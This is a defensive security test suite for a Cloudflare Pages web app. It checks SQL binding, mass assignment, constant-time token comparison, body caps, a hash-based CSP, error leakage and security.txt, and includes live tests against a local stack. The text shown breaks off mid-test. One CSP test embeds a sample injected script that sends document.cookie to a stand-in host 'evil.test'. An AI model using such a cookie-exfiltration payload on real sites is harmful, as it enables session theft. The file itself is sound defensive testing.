/* ==========================================================================
   THE SECURITY REVIEW, AS TESTS.

   docs/SECURITY-REVIEW.md is the prose. This file is the part that keeps being
   true: one test per item that was walked, so a fix cannot quietly come undone.

   Two halves.

   The first half always runs. It reads the functions' own source and the built
   export and asserts the things that are properties of the code: that no SQL is
   built by concatenating anything a caller controls, that no write path copies a
   request body into a database row, that the admin token is not compared with
   ===, that the body cap counts bytes, that the CSP a page gets names the hash
   of every inline script on it and nothing wider.

   The second half runs only when SEC_BASE names a running local stack:

     OUT_NAME=out-security bash cf/build-static.sh
     cd cf && npx wrangler pages dev out-security --port 8843 \
       --persist-to .wrangler/state-security \
       --d1 DB=3c6cf7a7-e060-48fd-9e1f-646eb89ad461 --kv LEDGER
     SEC_BASE=http://127.0.0.1:8843 npm test

   NEVER point SEC_BASE at the live site. These tests create accounts, spend
   recovery codes and deliberately trip the rate limiter.

   Every live test sends its own cf-connecting-ip. The limiter and the admin
   lockout are keyed by a hash of that address, so each test gets its own bucket
   and one test tripping a limit cannot make the next one fail. At the edge
   Cloudflare sets that header itself and a client cannot forge it; locally it is
   how a test asks for a fresh bucket.
   ========================================================================== */
import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, existsSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { cspForHtml } from '../cf/functions/_middleware.js';
import { readJson, MAX_BODY } from '../cf/functions/api/_http.js';
import { sessionCookie, clearCookie, isAdmin } from '../cf/functions/api/_db.js';
import {
  constantTimeEquals, timingSafeEqual, PBKDF2_ITERATIONS, PBKDF2_PASSES,
  hashPassword, verifyPassword, needsRehash, DECOY_HASH, DECOY_SALT, parseHash,
} from '../cf/functions/api/auth/password/_kdf.js';

const ROOT = join(__dirname, '..');
const FUNCTIONS = join(ROOT, 'cf/functions');

/** Every .js under cf/functions, with its text. The review is about all of them. */
function functionSources(): { path: string; text: string }[] {
  const out: { path: string; text: string }[] = [];
  const walk = (dir: string) => {
    for (const e of readdirSync(dir, { withFileTypes: true })) {
      const p = join(dir, e.name);
      if (e.isDirectory()) walk(p);
      else if (e.name.endsWith('.js')) out.push({ path: p.slice(ROOT.length + 1), text: readFileSync(p, 'utf8') });
    }
  };
  walk(FUNCTIONS);
  return out;
}
const SOURCES = functionSources();

/** A source guard has to read CODE. Several of the fixes below are documented in
 *  a comment that quotes the line being replaced, and a guard that reads the
 *  comment fails on the explanation of its own fix. */
const codeOnly = (text: string) => text.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:])\/\/[^\n]*/g, '$1');

/** A built export to read, if one is on disk. CI runs the tests before the
 *  build, so these are skipped there and run on a developer machine and in the
 *  deploy gate, which builds first. */
function exportDir(): string | null {
  if (process.env.SEC_OUT && existsSync(process.env.SEC_OUT)) return process.env.SEC_OUT;
  const candidates = [join(ROOT, 'cf/out'), ...readdirSync(join(ROOT, 'cf'))
    .filter((n) => n.startsWith('out-'))
    .map((n) => join(ROOT, 'cf', n))];
  for (const c of candidates) if (existsSync(join(c, 'index.html'))) return c;
  return null;
}
const OUT = exportDir();

// ==========================================================================
// A03 Injection — SQL is only ever bound, never built
// ==========================================================================
describe('A03 injection: every SQL statement binds its values', () => {
  /* The four places that put an identifier into SQL by interpolation. Each is
     listed here with the reason it is safe, so a fifth one cannot appear
     without this test going red and somebody having to write its reason down. */
  const ALLOWED_INTERPOLATION = [
    'cf/functions/api/_db.js',        // insert(): table is a literal at every call site, columns are the caller's own keys
    'cf/functions/api/_counters.js',  // table name from a module-level list
    'cf/functions/api/_hash.js',      // appendChained(): table must be a key of PUBLISHED or it throws
    'cf/functions/api/me.js',         // a hard-coded array of table names
  ];

  it('no statement interpolates anything outside the four reviewed helpers', () => {
    const offenders: string[] = [];
    for (const { path, text } of SOURCES) {
      if (ALLOWED_INTERPOLATION.includes(path)) continue;
      for (const line of text.split('\n')) {
        // a prepared statement whose SQL is a template literal with a hole in it,
        // or a string joined with +, is the shape this forbids
        if (/prepare\(\s*`[^`]*\$\{/.test(line)) offenders.push(`${path}: ${line.trim()}`);
        if (/\b(all|one|run)\(\s*env\s*,\s*`[^`]*\$\{/.test(line)) offenders.push(`${path}: ${line.trim()}`);
        if (/prepare\(\s*['"][^'"]*['"]\s*\+/.test(line)) offenders.push(`${path}: ${line.trim()}`);
      }
    }
    expect(offenders).toEqual([]);
  });

  it('the four reviewed helpers interpolate an identifier and never a value', () => {
    const db = readFileSync(join(FUNCTIONS, 'api/_db.js'), 'utf8');
    // values go through .bind(...) — the VALUES clause is only ever ?n placeholders
    expect(db).toMatch(/VALUES \(\$\{q\}\)/);
    expect(db).toMatch(/\.bind\(\.\.\.cols\.map/);
    const me = readFileSync(join(FUNCTIONS, 'api/me.js'), 'utf8');
    expect(me).toMatch(/for \(const t of \['corrections', 'gap_reports', 'survey_responses'\]\)/);
    const hash = readFileSync(join(FUNCTIONS, 'api/_hash.js'), 'utf8');
    expect(hash).toMatch(/const project = PUBLISHED\[table\];/);
    expect(hash).toMatch(/if \(!project\) throw new Error/);
  });
});

// ==========================================================================
// A01/A08 Mass assignment — a request body never becomes a row
// ==========================================================================
describe('A01: no write path copies a request body into a database row', () => {
  it('nothing spreads a body, a parsed object or a validator result into insert() or appendChained()', () => {
    const offenders: string[] = [];
    for (const { path, text } of SOURCES) {
      const calls = text.match(/(?:insert|appendChained)\([^;]*?\{[\s\S]{0,600}?\}/g) || [];
      for (const c of calls) {
        if (/\.\.\.\s*(body|json|input|payload|req|v|r)\b/.test(c)) offenders.push(`${path}: ${c.slice(0, 120)}`);
      }
    }
    expect(offenders).toEqual([]);
  });

  it('the one spread that does exist is the helper adding its own id, not caller data', () => {
    const db = readFileSync(join(FUNCTIONS, 'api/_db.js'), 'utf8');
    expect(db).toMatch(/const r = \{ id: row\.id \|\| id\(\), \.\.\.row \};/);
  });
});

// ==========================================================================
// A07 Identification and authentication
// ==========================================================================
describe('A07: the admin token is compared in constant time', () => {
  /* The hole, in one line: `a === \`Bearer ${env.ADMIN_TOKEN}\``. === on strings
     compares length first, then left to right, and returns at the first
     difference, so the time to refuse is a function of how much was right. */
  it('_db.js no longer compares the bearer header with ===', () => {
    const db = codeOnly(readFileSync(join(FUNCTIONS, 'api/_db.js'), 'utf8'));
    expect(db).not.toMatch(/=== `Bearer/);
    expect(db).not.toMatch(/`Bearer \$\{env\.ADMIN_TOKEN\}` ===/);
    expect(db).toMatch(/constantTimeEquals\(a, `Bearer \$\{env\.ADMIN_TOKEN\}`\)/);
  });

  it('constantTimeEquals says no to a right prefix, a longer string and a wrong type', () => {
    expect(constantTimeEquals('Bearer abc123', 'Bearer abc123')).toBe(true);
    expect(constantTimeEquals('Bearer abc12', 'Bearer abc123')).toBe(false);   // right prefix, short
    expect(constantTimeEquals('Bearer abc1234', 'Bearer abc123')).toBe(false); // right prefix, long
    expect(constantTimeEquals('', '')).toBe(true);
    expect(constantTimeEquals('x', '')).toBe(false);
    expect(constantTimeEquals(null, 'Bearer x')).toBe(false);   // a header that was never sent arrives as null
  });

  it('constantTimeEquals does not return before the loop, whatever the lengths', () => {
    /* The guarantee is a fixed iteration count, which a unit test cannot time
       reliably on a shared machine. What it CAN prove is the shape: the source
       has exactly one loop with a constant bound, and no return inside it. */
    const kdf = readFileSync(join(FUNCTIONS, 'api/auth/password/_kdf.js'), 'utf8');
    const fn = kdf.slice(kdf.indexOf('export function constantTimeEquals'));
    const body = fn.slice(0, fn.indexOf('\n}\n') + 2);
    expect(body).toMatch(/for \(let i = 0; i < COMPARE_WINDOW; i \+= 1\)/);
    /* Two returns and no more: the type guard, and the verdict after the loop.
       A third would be an early exit, which is the whole bug this replaces. */
    expect(body.match(/return/g) || []).toHaveLength(2);
    expect(body.slice(body.indexOf('for ('))).not.toMatch(/return[\s\S]*\}\n\s*return diff/);
    expect(kdf).toMatch(/const COMPARE_WINDOW = 512;/);
  });

  it('isAdmin refuses when no token is configured, so an unset secret is never an open door', () => {
    const req = (auth: string) => new Request('https://x.test/api/admin/stats', { headers: { authorization: auth } });
    expect(isAdmin({}, req('Bearer '))).toBe(false);
    expect(isAdmin({ ADMIN_TOKEN: '' }, req('Bearer '))).toBe(false);
    expect(isAdmin({ ADMIN_TOKEN: 'right' }, req('Bearer right'))).toBe(true);
    expect(isAdmin({ ADMIN_TOKEN: 'right' }, req('Bearer wrong'))).toBe(false);
    expect(isAdmin({ ADMIN_TOKEN: 'right' }, req('Basic right'))).toBe(false);
  });
});

describe('A07: password derivation is what it says it is', () => {
  it('runs 100,000 iterations five times, inside the workerd ceiling', async () => {
    expect(PBKDF2_ITERATIONS).toBe(100000);
    expect(PBKDF2_PASSES).toBe(5);
    const { hash, salt } = await hashPassword('correct-horse-battery', {});
    expect(hash.startsWith('pbkdf2-sha256$100000x5$')).toBe(true);
    expect(await verifyPassword('correct-horse-battery', hash, salt)).toBe(true);
    expect(await verifyPassword('correct-horse-batter', hash, salt)).toBe(false);
    expect(needsRehash(hash, {})).toBe(false);
    expect(needsRehash('pbkdf2-sha256$600000$' + 'A'.repeat(43) + '=', {})).toBe(true);
  }, 20000);

  it('the decoy carries the same parameters, so an unknown address costs the same work', () => {
    const decoy = parseHash(DECOY_HASH);
    expect(decoy).not.toBeNull();
    expect(decoy!.iterations).toBe(PBKDF2_ITERATIONS);
    expect(decoy!.passes).toBe(PBKDF2_PASSES);
    expect(DECOY_SALT.length).toBeGreaterThan(0);
  });

  it('timingSafeEqual has no early exit on two equal-length digests', () => {
    expect(timingSafeEqual('abcd', 'abcd')).toBe(true);
    expect(timingSafeEqual('abcd', 'abce')).toBe(false);
    expect(timingSafeEqual('abcd', 'abc')).toBe(false);
  });
});

describe('A07: the session cookie', () => {
  it('is HttpOnly, SameSite=Lax and Secure on https', () => {
    const c = sessionCookie('sid-1', new Request('https://waypoint-ledger.pages.dev/api/auth/password/login', { method: 'POST' }));
    expect(c).toMatch(/^wl_session=sid-1;/);
    expect(c).toMatch(/HttpOnly/);
    expect(c).toMatch(/SameSite=Lax/);
    expect(c).toMatch(/Secure/);
    expect(c).toMatch(/Max-Age=2592000/);
    expect(c).toMatch(/Path=\//);
  });
  it('drops Secure on http, because a cookie a local browser refuses is a sign-in that cannot be tested', () => {
    const c = sessionCookie('sid-1', new Request('http://127.0.0.1:8843/api/auth/password/login', { method: 'POST' }));
    expect(c).not.toMatch(/Secure/);
    expect(c).toMatch(/HttpOnly/);
  });
  it('clearing it keeps the flags, so a browser matches and replaces the same cookie', () => {
    expect(clearCookie()).toMatch(/HttpOnly/);
    expect(clearCookie()).toMatch(/Max-Age=0/);
  });
});

// ==========================================================================
// A04 Insecure design — the body cap is a byte cap, applied where it is read
// ==========================================================================
describe('A04: the JSON body cap', () => {
  const post = (body: BodyInit, headers: Record<string, string> = {}) =>
    new Request('https://x.test/api/x', { method: 'POST', body, headers: { 'content-type': 'application/json', ...headers } });

  it('accepts an ordinary object', async () => {
    expect(await readJson(post('{"a":1}'))).toEqual({ body: { a: 1 } });
  });

  it('refuses a body whose content-length is over the cap', async () => {
    const big = JSON.stringify({ a: 'x'.repeat(MAX_BODY + 100) });
    expect(await readJson(post(big))).toEqual({ error: 'Body too large.' });
  });

  it('counts BYTES, not UTF-16 units: 16,008 three-byte characters is 48 KB', async () => {
    /* The old cap was `text.length > MAX_BODY`, which counts UTF-16 code units.
       This body is 16,008 units — under a 16,384 cap — and 48,008 bytes. */
    const multi = JSON.stringify({ a: '中'.repeat(16000) });
    expect(multi.length).toBeLessThan(MAX_BODY);
    expect(new TextEncoder().encode(multi).byteLength).toBeGreaterThan(MAX_BODY);
    expect(await readJson(post(multi))).toEqual({ error: 'Body too large.' });
  });

  it('cancels a chunked body with no content-length instead of buffering it', async () => {
    /* The middleware cap reads content-length. A client is not obliged to send
       one, and the old readJson did `await request.text()` first and measured
       second — the whole body was already in memory before it was refused. */
    let emitted = 0;
    const chunk = new TextEncoder().encode('x'.repeat(65536));
    const stream = new ReadableStream({
      pull(c) { if (emitted >= 8 * 1024 * 1024) { c.close(); return; } emitted += chunk.byteLength; c.enqueue(chunk); },
    });
    const req = new Request('https://x.test/api/x', {
      method: 'POST', body: stream, headers: { 'content-type': 'application/json' },
      // @ts-expect-error undici requires duplex for a stream body; the Workers runtime does not
      duplex: 'half',
    });
    expect(req.headers.get('content-length')).toBeNull();
    expect(await readJson(req)).toEqual({ error: 'Body too large.' });
    expect(emitted).toBeLessThanOrEqual(MAX_BODY + chunk.byteLength);   // one chunk, not eight megabytes
  });
});

// ==========================================================================
// A05 Security misconfiguration — the Content Security Policy
// ==========================================================================
describe('A05: the CSP is computed from the bytes being served', () => {
  const page = (scripts: string[], extra = '') =>
    `<!doctype html><html><head>${scripts.map((s) => `<script>${s}</script>`).join('')}` +
    `<script src="/_next/x.js"></script></head><body>${extra}</body></html>`;

  it('never allows unsafe-inline or unsafe-eval for script', async () => {
    const csp = await cspForHtml(page(['self.__next_f.push([0])', 'console.log(1)']));
    const scriptSrc = /script-src ([^;]*)/.exec(csp)![1];
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).not.toContain("'unsafe-eval'");
    expect(scriptSrc).not.toContain("'strict-dynamic'");
    expect(csp).toMatch(/object-src 'none'/);
    expect(csp).toMatch(/frame-ancestors 'none'/);
    expect(csp).toMatch(/base-uri 'self'/);
    expect(csp).toMatch(/form-action 'self'/);
  });

  it('names a hash for every inline script and none for a script with src', async () => {
    const csp = await cspForHtml(page(['a=1', 'b=2', 'a=1']));
    expect((csp.match(/'sha256-/g) || []).length).toBe(2);   // the duplicate is one source, not two
  });

  it('a script that was not in the file has no hash, so an injected one cannot run', async () => {
    const clean = await cspForHtml(page(['a=1']));
    const injected = "<script>fetch('https://evil.test?c='+document.cookie)</script>";
    // the policy that would be served for the clean page does not cover the injected script
    const injectedCsp = await cspForHtml(page(['a=1']) + injected);
    const hashOfInjected = /'sha256-[^']*'/g;
    const cleanHashes: string[] = clean.match(hashOfInjected) ?? [];
    const injectedHashes: string[] = injectedCsp.match(hashOfInjected) ?? [];
    expect(injectedHashes.length).toBe(cleanHashes.length + 1);
    for (const h of cleanHashes) expect(injectedHashes).toContain(h);
    expect(clean).not.toContain(injectedHashes.find((h) => !cleanHashes.includes(h))!);
  });

  it("adds 'unsafe-hashes' only to a page that has an inline event handler", async () => {
    const plain = await cspForHtml(page(['a=1']));
    const handler = await cspForHtml(page(['a=1'], '<button onclick="location.reload()">Try again</button>'));
    expect(plain).not.toContain("'unsafe-hashes'");
    expect(handler).toContain("'unsafe-hashes'");
    expect((handler.match(/'sha256-/g) || []).length).toBe(2);   // the script, and the handler
  });

  it('does not mistake prose for a handler attribute', async () => {
    const csp = await cspForHtml(page(['a=1'], '<p>the one thing on which everything turns</p>'));
    expect(csp).not.toContain("'unsafe-hashes'");
    expect((csp.match(/'sha256-/g) || []).length).toBe(1);
  });

  it.skipIf(!OUT)('covers every inline script in every page of the real export', async () => {
    const enc = new TextEncoder();
    const sha = async (t: string) => {
      const d = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(t)));
      return btoa(String.fromCharCode(...d));
    };
    const pages = readdirSync(OUT!, { recursive: true } as never) as string[];
    const html = pages.filter((p) => typeof p === 'string' && p.endsWith('.html'));
    expect(html.length).toBeGreaterThan(10);
    for (const rel of html) {
      const file = join(OUT!, rel);
      if (!statSync(file).isFile()) continue;
      const text = readFileSync(file, 'utf8');
      const csp = await cspForHtml(text);
      const scriptSrc = /script-src ([^;]*)/.exec(csp)![1];
      expect(scriptSrc, rel).not.toContain("'unsafe-inline'");
      expect(scriptSrc, rel).not.toContain("'unsafe-eval'");
      for (const m of text.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi)) {
        if (/\bsrc\s*=/i.test(m[1] || '') || !m[2]) continue;
        expect(csp, `${rel} is missing the hash of one of its own inline scripts`).toContain(`'sha256-${await sha(m[2])}'`);
      }
    }
  }, 60000);
});

// ==========================================================================
// A09 Logging and error handling — nothing internal reaches the caller
// ==========================================================================
describe('A09: an error response never carries an internal message', () => {
  it('no route hands a caught Error message back to the caller', () => {
    const offenders: string[] = [];
    for (const { path, text } of SOURCES) {
      for (const line of codeOnly(text).split('\n')) {
        if (/return\s+(bad|json)\(\s*(e|err|error)\s*(instanceof Error\s*\?\s*(e|err|error)\.message|\.message)/.test(line)) {
          offenders.push(`${path}: ${line.trim()}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('the two places that read a caught message only TEST it, and answer with their own words', () => {
    for (const f of ['api/auth/password/signup.js', 'api/auth/password/change.js']) {
      const text = readFileSync(join(FUNCTIONS, f), 'utf8');
      expect(text).toMatch(/const m = e instanceof Error \? e\.message : '';/);
      expect(text).toMatch(/if \(\/UNIQUE\|constraint\/i\.test\(m\)\)/);
      expect(text).not.toMatch(/bad\(m[,)]/);
    }
  });

  it('no function ever puts a stack into a response', () => {
    for (const { path, text } of SOURCES) expect(codeOnly(text), path).not.toMatch(/\.stack/);
  });
});

// ==========================================================================
// The vulnerability disclosure file — RFC 9116
// ==========================================================================
describe('security.txt is a valid RFC 9116 file', () => {
  const raw = readFileSync(join(ROOT, 'public/.well-known/security.txt'), 'utf8');
  const fields = new Map<string, string[]>();
  for (const line of raw.split('\n')) {
    if (!line.trim() || line.trimStart().startsWith('#')) continue;
    const m = /^([A-Za-z-]+):\s*(.+?)\s*$/.exec(line);
    expect(m, `not a field line: ${line}`).not.toBeNull();
    const [, name, value] = m!;
    fields.set(name.toLowerCase(), [...(fields.get(name.toLowerCase()) || []), value]);
  }

  it('has the one required field, Contact', () => {
    expect(fields.get('contact')).toEqual(['mailto:bo@precisionfederal.com']);
  });

  it('has exactly one Expires, and it has not passed', () => {
    expect(fields.get('expires')).toHaveLength(1);
    const expires = new Date(fields.get('expires')![0]);
    expect(Number.isNaN(expires.getTime())).toBe(false);
    expect(expires.getTime()).toBeGreaterThan(Date.now());          // renew it before this fails
    const year = 365 * 24 * 3600 * 1000;
    expect(expires.getTime() - Date.now()).toBeLessThan(year);      // RFC 9116 §2.5.5
  });

  it('names its own canonical URI over https', () => {
    const c = fields.get('canonical');
    expect(c).toHaveLength(1);
    expect(c![0]).toBe('https://waypoint-ledger.pages.dev/.well-known/security.txt');
  });

  it('carries no field RFC 9116 does not define', () => {
    const known = ['acknowledgments', 'canonical', 'contact', 'encryption', 'expires', 'hiring', 'policy', 'preferred-languages'];
    for (const k of fields.keys()) expect(known, `unknown field: ${k}`).toContain(k);
  });

  it.skipIf(!OUT)('is in the built export where a scanner will look for it', () => {
    expect(existsSync(join(OUT!, '.well-known/security.txt'))).toBe(true);
  });
});

// ==========================================================================
// A02 Cryptographic failures — no secret is in anything we serve
// ==========================================================================
describe('A02: no secret is in the built export', () => {
  const devVars = join(ROOT, 'cf/.dev.vars');
  const values = existsSync(devVars)
    ? readFileSync(devVars, 'utf8').split('\n')
        .filter((l) => l.includes('=') && !l.trimStart().startsWith('#'))
        .map((l) => l.slice(l.indexOf('=') + 1).replace(/^["']|["']$/g, ''))
        .filter((v) => v.length >= 16)
    : [];

  it.skipIf(!OUT || values.length === 0)('no built file contains ADMIN_TOKEN or INTERVIEW_KEY', () => {
    const files = (readdirSync(OUT!, { recursive: true } as never) as string[])
      .map((p) => join(OUT!, p))
      .filter((p) => { try { return statSync(p).isFile(); } catch { return false; } });
    expect(files.length).toBeGreaterThan(20);
    for (const f of files) {
      const text = readFileSync(f, 'latin1');
      for (const v of values) expect(text.includes(v), `${f.slice(ROOT.length + 1)} contains a secret`).toBe(false);
    }
  }, 60000);

  it('the secret is never written into a response by any function', () => {
    for (const { path, text } of SOURCES) {
      // reading env.ADMIN_TOKEN is fine; putting it in a body or a header is not
      expect(text, path).not.toMatch(/json\([^)]*env\.(ADMIN_TOKEN|INTERVIEW_KEY)/);
      expect(text, path).not.toMatch(/headers\.set\([^)]*env\.(ADMIN_TOKEN|INTERVIEW_KEY)/);
    }
  });
});

// ==========================================================================
// THE LIVE HALF — only with SEC_BASE
// ==========================================================================
const BASE = process.env.SEC_BASE || '';
const ADMIN = existsSync(join(ROOT, 'cf/.dev.vars'))
  ? (/^ADMIN_TOKEN=(.*)$/m.exec(readFileSync(join(ROOT, 'cf/.dev.vars'), 'utf8'))?.[1] || '').replace(/^["']|["']$/g, '')
  : '';

/** One request, from its own network, so no test can spend another's budget. */
const hit = (path: string, init: RequestInit & { ip: string }) =>
  fetch(`${BASE}${path}`, { ...init, headers: { 'cf-connecting-ip': init.ip, ...(init.headers || {}) }, redirect: 'manual' });

describe.skipIf(!BASE)('LIVE: response headers', () => {
  it('serves a hash CSP with no unsafe-inline for script', async () => {
    const r = await hit('/', { ip: '10.9.0.1' });
    expect(r.status).toBe(200);
    const csp = r.headers.get('content-security-policy') || '';
    const scriptSrc = /script-src ([^;]*)/.exec(csp)?.[1] || '';
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).not.toContain("'unsafe-eval'");
    expect(scriptSrc).toMatch(/'sha256-/);
    const html = await r.text();
    const enc = new TextEncoder();
    for (const m of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi)) {
      if (/\bsrc\s*=/i.test(m[1] || '') || !m[2]) continue;
      const d = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(m[2])));
      expect(scriptSrc).toContain(`'sha256-${btoa(String.fromCharCode(...d))}'`);
    }
  });

  it('sends HSTS with preload, nosniff, DENY, a referrer policy and a permissions policy', async () => {
    const r = await hit('/', { ip: '10.9.0.2' });
    expect(r.headers.get('strict-transport-security')).toBe('max-age=31536000; includeSubDomains; preload');
    expect(r.headers.get('x-content-type-options')).toBe('nosniff');
    expect(r.headers.get('x-frame-options')).toBe('DENY');
    expect(r.headers.get('referrer-policy')).toBe('strict-origin-when-cross-origin');
    expect(r.headers.get('permissions-policy')).toContain('geolocation=()');
    expect(r.headers.get('cross-origin-opener-policy')).toBe('same-origin');
  });

  it('locks an API answer down to nothing and never caches it', async () => {
    const r = await hit('/api/health', { ip: '10.9.0.3' });
    expect(r.headers.get('content-security-policy')).toBe("default-src 'none'; frame-ancestors 'none'; base-uri 'none'");
    expect(r.headers.get('cache-control')).toBe('no-store');
    expect(r.headers.get('access-control-allow-origin')).toBe('*');
  });

  it('never opens CORS on the three cookie-backed families', async () => {
    for (const p of ['/api/me', '/api/admin/stats', '/api/bluebutton/status']) {
      const g = await hit(p, { ip: '10.9.0.4' });
      expect(g.headers.get('access-control-allow-origin'), `GET ${p}`).toBeNull();
      const pre = await hit(p, { ip: '10.9.0.4', method: 'OPTIONS' });
      expect(pre.headers.get('access-control-allow-origin'), `OPTIONS ${p}`).toBeNull();
    }
    const open = await hit('/api/table', { ip: '10.9.0.4', method: 'OPTIONS' });
    expect(open.headers.get('access-control-allow-origin')).toBe('*');
  });

  it('serves security.txt as plain text', async () => {
    const r = await hit('/.well-known/security.txt', { ip: '10.9.0.5' });
    expect(r.status).toBe(200);
    expect(r.headers.get('content-type')).toMatch(/text\/plain/);
    expect(await r.text()).toMatch(/^Contact: mailto:/m);
  });
});

describe.skipIf(!BASE)('LIVE: the body cap', () => {
  it('refuses an oversized body with 413 before reading it', async () => {
    const r = await hit('/api/price', {
      ip: '10.9.1.1', method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ story: 'x'.repeat(MAX_BODY + 1000) }),
    });
    expect(r.status).toBe(413);
    expect((await r.json()) as unknown).toMatchObject({ ok: false });
  });

  it('refuses a chunked oversized body, which carries no content-length', async () => {
    let emitted = 0;
    const chunk = new TextEncoder().encode('x'.repeat(65536));
    const body = new ReadableStream({
      pull(c) { if (emitted >= 2 * 1024 * 1024) { c.close(); return; } emitted += chunk.byteLength; c.enqueue(chunk); },
    });
    const r = await fetch(`${BASE}/api/price`, {
      method: 'POST', body, headers: { 'content-type': 'application/json', 'cf-connecting-ip': '10.9.1.2' },
      // @ts-expect-error undici requires duplex for a stream body
      duplex: 'half',
    });
    expect([400, 413]).toContain(r.status);
    expect(JSON.stringify(await r.json())).toContain('too large');
  });
});

describe.skipIf(!BASE)('LIVE: the admin door', () => {
  it('accepts the real token and refuses a wrong one', async () => {
    expect(ADMIN.length).toBeGreaterThan(16);
    const good = await hit('/api/admin/stats', { ip: '10.9.2.1', headers: { authorization: `Bearer ${ADMIN}` } });
    expect(good.status).toBe(200);
    const bad = await hit('/api/admin/stats', { ip: '10.9.2.1', headers: { authorization: `Bearer ${ADMIN.slice(0, -1)}x` } });
    expect(bad.status).toBe(401);
  });

  it('refuses a token that is the right one with something added', async () => {
    const r = await hit('/api/admin/stats', { ip: '10.9.2.2', headers: { authorization: `Bearer ${ADMIN}extra` } });
    expect(r.status).toBe(401);
  });

  it('locks a network out after five wrong tokens, and the lockout is per network', async () => {
    const attacker = '10.9.2.30';
    let sawLockout = false;
    for (let i = 0; i < 7; i += 1) {
      const r = await hit('/api/admin/stats', { ip: attacker, headers: { authorization: `Bearer guess-${i}` } });
      expect([401, 429]).toContain(r.status);
      if (r.status === 429) sawLockout = true;
    }
    expect(sawLockout).toBe(true);
    // the real admin, from somewhere else, is untouched
    const elsewhere = await hit('/api/admin/stats', { ip: '10.9.2.31', headers: { authorization: `Bearer ${ADMIN}` } });
    expect(elsewhere.status).toBe(200);
  }, 30000);
});

describe.skipIf(!BASE)('LIVE: accounts, sessions and recovery codes', () => {
  const pw = 'correct-horse-battery-staple';
  const mk = () => `sec-${Math.random().toString(36).slice(2, 10)}@example.test`;

  it('sets an HttpOnly SameSite=Lax session cookie and never returns the hash', async () => {
    const r = await hit('/api/auth/password/signup', {
      ip: '10.9.3.1', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email: mk(), password: pw }),
    });
    expect(r.status).toBe(200);
    const cookie = r.headers.get('set-cookie') || '';
    expect(cookie).toMatch(/HttpOnly/);
    expect(cookie).toMatch(/SameSite=Lax/);
    expect(cookie).toMatch(/Path=\//);
    const text = JSON.stringify(await r.json());
    expect(text).not.toMatch(/pbkdf2/);
    expect(text).not.toMatch(/password_hash|passwordHash|salt/);
  }, 20000);

  it('spends a recovery code once and ends every other session', async () => {
    const email = mk();
    const signup = await hit('/api/auth/password/signup', {
      ip: '10.9.3.2', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email, password: pw }),
    });
    const { recoveryCode } = (await signup.json()) as { recoveryCode: string };
    const oldSession = (signup.headers.get('set-cookie') || '').split(';')[0];

    const first = await hit('/api/auth/password/recover', {
      ip: '10.9.3.2', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email, code: recoveryCode, newPassword: 'a-different-passphrase-1' }),
    });
    expect(first.status).toBe(200);
    const body = (await first.json()) as { recoveryCode: string; endedOtherSessions: boolean };
    expect(body.endedOtherSessions).toBe(true);
    expect(body.recoveryCode).not.toBe(recoveryCode);

    // the same code a second time is refused
    const second = await hit('/api/auth/password/recover', {
      ip: '10.9.3.2', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email, code: recoveryCode, newPassword: 'another-passphrase-2' }),
    });
    expect(second.status).toBe(401);

    // and the session that existed before the recovery is gone
    const me = await hit('/api/me', { ip: '10.9.3.2', headers: { cookie: oldSession } });
    expect(((await me.json()) as { user: unknown }).user).toBeNull();
  }, 40000);

  it('says the same thing about a wrong password and an address with no account', async () => {
    const email = mk();
    await hit('/api/auth/password/signup', {
      ip: '10.9.3.3', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email, password: pw }),
    });
    const wrongPassword = await hit('/api/auth/password/login', {
      ip: '10.9.3.3', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email, password: 'not-the-password-at-all' }),
    });
    const noAccount = await hit('/api/auth/password/login', {
      ip: '10.9.3.4', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email: mk(), password: 'not-the-password-at-all' }),
    });
    expect(wrongPassword.status).toBe(401);
    expect(noAccount.status).toBe(401);
    expect(await wrongPassword.json()).toEqual(await noAccount.json());
  }, 40000);

  it('a session cookie that was never issued opens nothing', async () => {
    const r = await hit('/api/me', { ip: '10.9.3.5', headers: { cookie: 'wl_session=00000000-0000-4000-8000-000000000000' } });
    expect(((await r.json()) as { user: unknown }).user).toBeNull();
    const del = await hit('/api/me', { ip: '10.9.3.5', method: 'DELETE', headers: { cookie: 'wl_session=00000000-0000-4000-8000-000000000000' } });
    expect(del.status).toBe(401);
  });
});

describe.skipIf(!BASE)('LIVE: a write path takes only the fields it validated', () => {
  it('an unknown field cannot forge an id, a timestamp or an owner', async () => {
    const table = await (await hit('/api/table', { ip: '10.9.4.1' })).json() as { items?: { id: string }[] };
    const priceId = table.items?.[0]?.id;
    expect(priceId, 'the price table has rows').toBeTruthy();
    const r = await hit('/api/corrections', {
      ip: '10.9.4.1', method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        priceId, verdict: 'wrong', believedValueUsd: 12,
        id: 'FORGED-ID', received_at: '1999-01-01T00:00:00.000Z', user_id: 'somebody-else',
        row_hash: 'forged', prev_hash: 'forged', submitter_hash: 'forged',
      }),
    });
    expect([200, 409, 429]).toContain(r.status);
    const rows = await (await hit('/api/export/corrections.csv', { ip: '10.9.4.1' })).text();
    expect(rows).not.toContain('FORGED-ID');
    expect(rows).not.toContain('1999-01-01');
    expect(rows).not.toContain('somebody-else');
  }, 30000);
});

describe.skipIf(!BASE)('LIVE: the rate limiter answers 429, never 500', () => {
  it('trips cleanly on a public write path and says how long to wait', async () => {
    const ip = '10.9.5.7';
    const codes: number[] = [];
    for (let i = 0; i < 24; i += 1) {
      const r = await hit('/api/gap?dry=1', {
        ip, method: 'POST', headers: { 'content-type': 'application/json' },
